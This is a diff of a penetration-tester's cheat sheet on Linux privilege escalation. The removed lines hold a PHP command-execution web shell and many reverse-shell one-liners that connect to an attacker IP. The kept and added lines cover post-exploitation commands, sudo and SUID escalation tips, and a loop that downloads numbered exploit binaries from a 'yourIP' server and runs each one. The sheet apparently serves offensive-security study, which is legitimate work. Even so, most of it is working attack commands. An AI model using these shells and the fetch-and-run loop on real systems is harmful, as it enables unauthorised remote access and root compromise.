@@ -1,61 +1,5 @@
 *Linux elevation of privileges*narrative
 
-Shells
-    PHP
-    *<?php echo '<pre>'; echo shell_exec($_GET['cmd']); echo '</pre>'; ?>*
-    PHP reverse shell filter bypassing:
-    *<?php
-echo 'running shell';
-$ip='attacker ip';
-$port='attacker port';
-$a='/bin/bash -i > /dev/tcp/'.$ip.'/'.$port.' 0<&1 2>&1';
-$b='0<&196;exec 196<>/dev/tcp/'.$ip.'/'.$port.'; sh <&196 >&196 2>&196';
-$c='nc '.$ip.' '.$port.' -e /bin/bash';
-$d='nc.exe -nv '.$ip.' '.$port.' -e cmd.exe';
-try {echo system($a);} catch (Exception $e) {echo $e;}
-try {echo system($b);} catch (Exception $e) {echo $e;}
-try {echo system($c);} catch (Exception $e) {echo $e;}
-try {echo system($d);} catch (Exception $e) {echo $e;}
-try {shell_exec($a);} catch (Exception $e) {echo $e;}
-try {shell_exec($b);} catch (Exception $e) {echo $e;}
-try {shell_exec($c);} catch (Exception $e) {echo $e;}
-try {shell_exec($d);} catch (Exception $e) {echo $e;}
-try {exec($a);} catch (Exception $e) {echo $e;}
-try {exec($b);} catch (Exception $e) {echo $e;}
-try {exec($c);} catch (Exception $e) {echo $e;}
-try {exec($d);} catch (Exception $e) {echo $e;}
-$sock=fsockopen($ip,$port);exec("/bin/sh -i <&3 >&3 2>&3");
-?>*
-    Kali reverse php shell:
-    */usr/share/webshells/php/php-reverse-shell.php*
-
-Reverse shells
-    Using netcat
-    *nc <attacker_ip> <port> -e /bin/bash*
-    Using bash and TCP sockets
-    */bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1*
-    Using sh and TCP sockets
-    *0<&196;exec 196<>/dev/tcp/<attacker_ip>/<port>; sh <&196 >&196 2>&196*
-    Using telnet
-    *telnet <attacker_ip> <1st_port> | /bin/bash | telnet <attacker_ip> <2nd_port>*
-    PHP and sh
-    *php -r '$sock=fsockopen("<attacker_ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'*
-    Perl and sh
-    *perl -e 'use Socket;$i="<attacker_ip>";$p=<port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'*
-    Perl forking:
-    *$ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ip:port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'*
-    Python
-    *python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'*
-    Reverse shell with python script:
-    *#!/usr/bin/python
-import socket,subprocess,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("IP",port))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-p=subprocess.call(["/bin/sh","-i"])*
-
 Post exploitation
     Get a TTY shell after a reverse shell connection
     *$ python -c 'import pty;pty.spawn("/bin/bash")'*
@@ -103,11 +47,13 @@ perl -e 'exec "/bin/bash";'*
 Linux elevation of privileges, manual testing
     Things to look: Miss-configured services (cronjobs), incorrect file permissions (exportfs, sudo), miss-configured environment ($PATH), binary with SUID bit, software or OS with known vulnerabilities.
     First try simple sudo:
-    *$ sudo su*
+    *$ sudo su -*
     What can we run with sudo?
     *$ sudo -l*
     What services are running as root?:
     *$ ps aux | grep root*
+
+    Look for vulnerable/privileged components such as: mysql, sudo, udev, python
 
     If */etc/exports* if writable, you can add an NFS entry to a root directory, put a binary with SUID bit on, and get root
     If there is a *cronjob* that runs as run but it has incorrect file permissions, you can change it to run your SUID binary and get a shell.
@@ -264,3 +210,6 @@ Open an xterm remotely
 
 Get proof
     *$ echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "*
+
+Elevation in 2.6.x:
+    *$ for a in 9352 9513 33321 15774 15150 15944 9543 33322 9545 25288 40838 40616 40611 ; do wget http://yourIP:8000/$a; chmod +x $a; ./$a; id; done*
